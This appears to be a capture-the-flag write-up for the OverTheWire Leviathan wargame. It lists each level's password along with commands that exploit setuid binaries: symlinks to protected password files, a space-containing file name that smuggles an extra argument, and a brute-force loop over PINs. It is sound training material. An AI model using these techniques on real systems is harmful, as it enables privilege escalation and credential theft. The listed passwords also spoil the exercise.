#Leviathan writeup
[http://www.overthewire.org/wargames/leviathan/](http://www.overthewire.org/wargames/leviathan/)

##Level 0:
    ssh leviathan0@leviathan.labs.overthewire.org

pass is `leviathan0`

    less /README.txt

Note that "Passwords for each level are stored in /etc/mygame_pass/.""

    ls -a
    cd .backup
    ls
    cat bookmarks.html | grep password

##Level 1:
    ssh leviathan1@leviathan.labs.overthewire.org

pass is `rioGegei8m`

    ls
    strings check
    ./check
    sex
    cat /etc/leviathan_pass/leviathan2

##Level 2:
    ssh leviathan2@leviathan.labs.overthewire.org

pass is `ougahZi8Ta`

    ls
    ls -l printfile
    ./printfile
    mkdir /tmp/lchack-qrohlf
    echo "foo" > tmp/lchack-qrohlf/foo.txt
    ./printfile /tmp/lchack-qrohlf/foo.txt
    cd /tmp/lchack-qrohlf
    ln -s /etc/leviathan_pass/leviathan3
    touch "somefile leviathan3"
    ~/printfile "somefile leviathan3"

##Level 3:
    ssh leviathan3@leviathan.labs.overthewire.org

pass is `Ahdiemoo1j`

    ls -a
    ./level3
    strings level3
    for i in `strings level3`; do echo $i && echo $i | ./level3; done
    ./level3
    snlprintf
    cat /etc/leviathan_pass/leviathan4

##Level 4:
    ssh leviathan4@leviathan.labs.overthewire.org

pass is `vuH0coox6m`

    ls -a
    cd .trash
    ./bin

used an online binary to ASII converter to get `Tith4cokei` from the output

##Level 5:
    ssh leviathan5@leviathan.labs.overthewire.org

pass is `Tith4cokei`

    ls
    ./leviathan5
    echo "foo" > /tmp/file.log
    ./leviathan5
    ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
    ./leviathan5

##Level 6:

    ssh leviathan6@leviathan.labs.overthewire.org

pass is `UgaoFee4li`

    ls 
    ./leviathan6
    for i in {1000..9999}; do echo $i; ./leviathan6 $i; done
    ./leviathan6 7123
    cat /etc/leviathan_pass/leviathan7

##Level 7:

    ssh leviathan7@leviathan.labs.overthewire.org

pass is `ahy7MaeBo9`

    cat CONGRATULATIONS 
